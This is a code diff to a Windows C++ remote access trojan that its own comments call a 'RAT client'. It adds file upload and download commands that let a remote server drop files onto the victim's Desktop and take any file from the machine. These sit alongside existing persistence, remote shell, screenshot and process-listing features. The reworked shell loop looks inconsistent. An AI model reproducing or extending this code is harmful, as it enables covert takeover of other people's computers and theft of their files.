@@ -17,6 +17,8 @@
 #include <cstdint>
 #include <shlobj.h> // For SHGetFolderPath
 #include <direct.h> // For _getcwd
+#include <iomanip> // For std::setprecision
+#include <fstream> // For file operations
 // Basic headers for RAT functionality
 
 // Link with required libraries
@@ -41,6 +43,8 @@ static CRITICAL_SECTION g_screen_sharing_cs;
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 void establish_persistence();
 std::string get_sysinfo();
+bool receive_file(SOCKET sock, const std::string& destination_path);
+bool send_file(SOCKET sock, const std::string& file_path);
 bool capture_and_send_screenshot(SOCKET sock);
 std::string list_processes();
 DWORD GetActualProcessIdByName(const std::string& processName);
@@ -1070,17 +1074,10 @@ bool interactive_shell(SOCKET sock)
         char buffer[4096];
         int bytesReceived;
         
-        while (true) {
-            // Receive command from server
-            bytesReceived = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
-            if (bytesReceived <= 0) {
-                break;
-            }
-            
-            buffer[bytesReceived] = '\0';
-            
-            // Check for exit command
-            if (strcmp(buffer, "exit_shell") == 0) {
+        while ((bytesReceived = recv(clientSock, buffer, sizeof(buffer) - 1, 0)) > 0)
+        {
+            // Handle different commands
+            if (strncmp(buffer, "screenshot", 10) == 0) {
                 // Send exit command to cmd.exe
                 const char* exitCmd = "exit\r\n";
                 DWORD bytesWritten;
@@ -2466,6 +2463,205 @@ void establish_persistence()
     }
 }
 
+// File transfer functions
+bool receive_file(SOCKET sock, const std::string& destination_path)
+{
+    try
+    {
+        // First receive the file size (8 bytes)
+        char size_buffer[8];
+        int bytes_received = recv(sock, size_buffer, 8, 0);
+        if (bytes_received != 8)
+        {
+            std::cout << "Failed to receive file size" << std::endl;
+            return false;
+        }
+        
+        // Convert from big-endian to host byte order
+        uint64_t file_size_be = 0;
+        memcpy(&file_size_be, size_buffer, 8);
+        uint64_t file_size = _byteswap_uint64(file_size_be);
+        
+        // Create the destination directory if it doesn't exist
+        std::string directory = destination_path.substr(0, destination_path.find_last_of("\\/"));
+        if (!directory.empty() && directory.length() > 3) // Skip drive letters like "C:\"
+        {
+            // Create directory recursively, but skip the drive letter part
+            std::string current_path;
+            bool skip_drive = false;
+            
+            for (size_t i = 0; i < directory.length(); i++)
+            {
+                char c = directory[i];
+                current_path += c;
+                
+                // Skip creating directory for drive letters (e.g., "C:\")
+                if (i == 2 && current_path.length() == 3 && current_path[1] == ':' && current_path[2] == '\\')
+                {
+                    skip_drive = true;
+                    continue;
+                }
+                
+                if ((c == '\\' || c == '/' || i == directory.length() - 1) && !skip_drive)
+                {
+                    if (!CreateDirectoryA(current_path.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
+                    {
+                        std::cout << "DEBUG: Failed to create directory: " << current_path << std::endl;
+                        // Don't return false, just continue - the file might still be writable
+                    }
+                }
+                
+                if (skip_drive && (c == '\\' || c == '/'))
+                {
+                    skip_drive = false; // Reset after passing the drive letter
+                }
+            }
+        }
+        
+        // Debug: Show what we're trying to create
+        std::cout << "DEBUG: Creating file: " << destination_path << std::endl;
+        std::cout << "DEBUG: File size to receive: " << file_size << " bytes" << std::endl;
+        
+        // Open the destination file
+        std::ofstream file(destination_path, std::ios::binary);
+        if (!file.is_open())
+        {
+            std::cout << "DEBUG: Failed to open destination file: " << destination_path << std::endl;
+            std::cout << "DEBUG: Error code: " << GetLastError() << std::endl;
+            return false;
+        }
+        
+        std::cout << "DEBUG: File opened successfully for writing" << std::endl;
+        
+        // Receive the file in chunks
+        const int chunk_size = 8192; // 8KB chunks
+        char buffer[chunk_size];
+        uint64_t total_received = 0;
+        
+        while (total_received < file_size)
+        {
+            int to_receive = (file_size - total_received < chunk_size) ? 
+                             static_cast<int>(file_size - total_received) : chunk_size;
+            
+            int bytes_received = recv(sock, buffer, to_receive, 0);
+            if (bytes_received <= 0)
+            {
+                std::cout << "DEBUG: Failed to receive data chunk. Error: " << WSAGetLastError() << std::endl;
+                std::cout << "DEBUG: Total received so far: " << total_received << "/" << file_size << " bytes" << std::endl;
+                file.close();
+                return false;
+            }
+            
+            file.write(buffer, bytes_received);
+            total_received += bytes_received;
+            
+            // Show progress
+            int progress = static_cast<int>((total_received * 100) / file_size);
+            std::cout << "\rDEBUG: Progress: " << progress << "% (" << total_received << "/" << file_size << " bytes)";
+            std::cout.flush();
+        }
+        
+        file.close();
+        std::cout << "\nFile received successfully: " << destination_path << std::endl;
+        
+        return true;
+    }
+    catch (const std::exception& e)
+    {
+        std::cout << "Exception in receive_file: " << e.what() << std::endl;
+        return false;
+    }
+}
+
+bool send_file(SOCKET sock, const std::string& file_path)
+{
+    try
+    {
+        // Open the file
+        std::ifstream file(file_path, std::ios::binary | std::ios::ate);
+        if (!file.is_open())
+        {
+            std::cout << "Failed to open file: " << file_path << std::endl;
+            return false;
+        }
+        
+        // Get file size
+        uint64_t file_size = file.tellg();
+        file.seekg(0, std::ios::beg);
+        
+        // Send file size (8 bytes) in big-endian format for consistency
+        uint64_t file_size_be = _byteswap_uint64(file_size);
+        send(sock, reinterpret_cast<char*>(&file_size_be), 8, 0);
+        
+        // Send file name (for the server to extract)
+        std::string file_name = file_path.substr(file_path.find_last_of("\\/") + 1);
+        size_t name_length = file_name.length();
+        
+        // Send name length as 8 bytes (little-endian for Windows)
+        uint64_t name_length_64 = static_cast<uint64_t>(name_length);
+        send(sock, reinterpret_cast<char*>(&name_length_64), 8, 0);
+        send(sock, file_name.c_str(), name_length, 0);
+        
+        // Send the file in chunks
+        const int chunk_size = 8192; // 8KB chunks
+        char buffer[chunk_size];
+        uint64_t total_sent = 0;
+        
+        while (total_sent < file_size)
+        {
+            int to_read = (file_size - total_sent < chunk_size) ? 
+                          static_cast<int>(file_size - total_sent) : chunk_size;
+                          
+            file.read(buffer, to_read);
+            int bytes_read = static_cast<int>(file.gcount());
+            
+            if (bytes_read <= 0)
+                break;
+                
+            int bytes_sent = send(sock, buffer, bytes_read, 0);
+            
+            if (bytes_sent <= 0)
+            {
+                std::cout << "Connection error while sending file" << std::endl;
+                file.close();
+                return false;
+            }
+            
+            total_sent += bytes_sent;
+            
+            // Print progress percentage
+            double progress = (static_cast<double>(total_sent) / file_size) * 100.0;
+            std::cout << "\rSending file: " << std::fixed << std::setprecision(2) << progress << "%" << std::flush;
+            
+            // Small delay to prevent network congestion
+            if (total_sent % (chunk_size * 10) == 0) // Every ~80KB
+            {
+                Sleep(1);
+            }
+        }
+        
+        file.close();
+        std::cout << "\nFile sent successfully: " << file_path << std::endl;
+        
+        // Wait for confirmation from server
+        char confirm_buffer[256] = {0};
+        int bytes_received = recv(sock, confirm_buffer, 255, 0);
+        
+        if (bytes_received > 0)
+        {
+            std::string confirmation(confirm_buffer);
+            std::cout << "Server response: " << confirmation << std::endl;
+        }
+        
+        return true;
+    }
+    catch (const std::exception& e)
+    {
+        std::cout << "Exception in send_file: " << e.what() << std::endl;
+        return false;
+    }
+}
+
 int main()
 {
     // Establish persistence first
@@ -2551,6 +2747,9 @@ int main()
                 break;
             }
 
+            // Null terminate the received data
+            buffer[bytes_read] = '\0';
+            
             std::cout << "Received command: " << buffer << std::endl;
 
             // Process commands
@@ -2895,6 +3094,110 @@ int main()
                 // Send a special end marker
                 const char *end_marker = "##END_OF_SYSTEM_LOGS##";
                 send(sock, end_marker, strlen(end_marker), 0);
+            }
+            else if (strncmp(buffer, "upload_file ", 12) == 0)
+            {
+                std::string filename = buffer + 12;
+                
+                // Trim leading and trailing whitespace
+                filename.erase(0, filename.find_first_not_of(" \t\r\n"));
+                filename.erase(filename.find_last_not_of(" \t\r\n") + 1);
+                
+                // Try to save to Desktop first, fallback to current directory
+                std::string destination_path;
+                char desktop_path[MAX_PATH];
+                if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, desktop_path) == S_OK)
+                {
+                    destination_path = std::string(desktop_path) + "\\" + filename;
+                    std::cout << "DEBUG: Receiving file from server to Desktop: " << destination_path << std::endl;
+                }
+                else
+                {
+                    // Fallback to current directory where the RAT client exe is located
+                    destination_path = filename;
+                    std::cout << "DEBUG: Desktop path failed, saving to current directory: " << destination_path << std::endl;
+                }
+                
+                // Send acknowledgment before receiving file
+                response = "Ready to receive file";
+                std::cout << "DEBUG: Sending acknowledgment: " << response << std::endl;
+                send(sock, response.c_str(), response.length(), 0);
+                
+                // Small delay to ensure server receives acknowledgment
+                Sleep(200);
+                
+                // Receive the file directly - this completely exits the command loop temporarily
+                std::cout << "DEBUG: Exiting command loop to receive file..." << std::endl;
+                std::cout << "DEBUG: Starting to receive file..." << std::endl;
+                bool success = receive_file(sock, destination_path);
+                
+                if (success) {
+                    std::cout << "DEBUG: File received successfully: " << filename << std::endl;
+                } else {
+                    std::cout << "DEBUG: Failed to receive file" << std::endl;
+                }
+                
+                // Clear any remaining data in socket buffer and flush
+                Sleep(500);
+                
+                // Try to flush any remaining data from socket buffer
+                char flush_buffer[1024];
+                int available_bytes = 0;
+                ioctlsocket(sock, FIONREAD, (u_long*)&available_bytes);
+                if (available_bytes > 0) {
+                    std::cout << "DEBUG: Flushing " << available_bytes << " remaining bytes from socket" << std::endl;
+                    while (available_bytes > 0) {
+                        int to_flush = (available_bytes > 1024) ? 1024 : available_bytes;
+                        int flushed = recv(sock, flush_buffer, to_flush, 0);
+                        if (flushed <= 0) break;
+                        available_bytes -= flushed;
+                        ioctlsocket(sock, FIONREAD, (u_long*)&available_bytes);
+                    }
+                }
+                
+                // Continue to next iteration to resume command processing
+                continue;
+            }
+            else if (strncmp(buffer, "download_file ", 14) == 0)
+            {
+                std::string file_path = buffer + 14;
+                
+                // Trim leading and trailing whitespace
+                file_path.erase(0, file_path.find_first_not_of(" \t\r\n"));
+                file_path.erase(file_path.find_last_not_of(" \t\r\n") + 1);
+                
+                std::cout << "DEBUG: Received download_file command for: " << file_path << std::endl;
+                
+                // Check if file exists
+                if (GetFileAttributesA(file_path.c_str()) == INVALID_FILE_ATTRIBUTES)
+                {
+                    response = "File not found: " + file_path;
+                    std::cout << "DEBUG: File not found, sending error response" << std::endl;
+                    send(sock, response.c_str(), response.length(), 0);
+                }
+                else
+                {
+                    // Send acknowledgment before sending file
+                    response = "File found, preparing to send";
+                    std::cout << "DEBUG: File found, sending acknowledgment" << std::endl;
+                    send(sock, response.c_str(), response.length(), 0);
+                    
+                    // Small delay to ensure acknowledgment is received
+                    Sleep(100);
+                    
+                    // Send the file
+                    std::cout << "DEBUG: Starting file transfer..." << std::endl;
+                    bool success = send_file(sock, file_path);
+                    
+                    if (!success) {
+                        std::cout << "DEBUG: File transfer failed" << std::endl;
+                    } else {
+                        std::cout << "DEBUG: File transfer completed successfully" << std::endl;
+                    }
+                    
+                    // Continue to next iteration to resume command processing
+                    continue;
+                }
             }
             else
             {
